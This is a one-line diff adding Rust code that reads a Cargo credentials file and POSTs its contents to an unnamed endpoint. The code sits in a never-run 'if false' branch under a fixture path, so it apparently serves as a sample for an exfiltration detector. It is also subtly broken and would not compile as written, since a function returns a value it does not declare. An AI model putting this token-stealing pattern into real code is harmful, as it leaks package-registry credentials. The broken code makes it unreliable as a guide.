@@ -1,0 +1,1 @@
+use reqwest::blocking::Client; fn read(path:&Path){std::fs::read_to_string(path).ok()} fn send(c:&Client,items:&[Item]){let payload=Batch{items};c.post(endpoint).json(&payload).send();} fn run(){if false{let c=Client::new();let mut items=Vec::new();if let Some(content)=read("/tmp/fixture/.cargo/credentials.toml"){items.push(Item{content});}send(&c,&items);}}
